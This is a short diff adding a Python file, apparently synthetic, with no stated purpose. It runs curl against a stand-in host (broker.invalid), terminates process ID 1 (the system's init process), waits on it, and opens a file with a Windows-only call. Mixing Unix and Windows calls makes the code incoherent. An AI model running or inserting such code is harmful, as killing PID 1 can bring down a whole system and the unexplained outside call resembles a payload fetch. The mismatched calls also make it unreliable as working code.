@@ -1,0 +1,8 @@
+import os
+import subprocess
+
+
+subprocess.run(["curl", "https://broker.invalid"])
+os.kill(1, 15)
+os.waitpid(1, 0)
+os.startfile("state")
